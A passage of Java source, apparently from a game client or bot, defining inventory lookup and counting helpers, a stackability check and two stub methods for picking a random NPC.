			try
			{
				Thread.sleep(1);
			}
			catch (Exception e) { e.toString(); }
		}
	}

    public int InvByName(String name)
    {
        for(int k = 0; k < InvCount; k++)
            if(GetItemName(inv[k]).equals(name))
				return k;
        return -1;
    }

    public int InvCountByName(String name)
    {
        int l = identify.anInt144;
        int j = 0;
        for(int k = 0; k < InvCount; k++)
            if(GetItemName(inv[k]).equals(name))
                if(identify.ahl[inv[k]] == 1)
                    j++;
                else
                    j += dkb[k];

        return j;
    }

	public boolean IsStackable(int id)
	{
		if (identify.ahl[id] != 1)
			return true;
		return false;
	}

	public int GetRandomNPC(int id)
	{
		return 0;
	}

	public int GetRandomNPC(int id[])
	{
		return 0;
	}
}
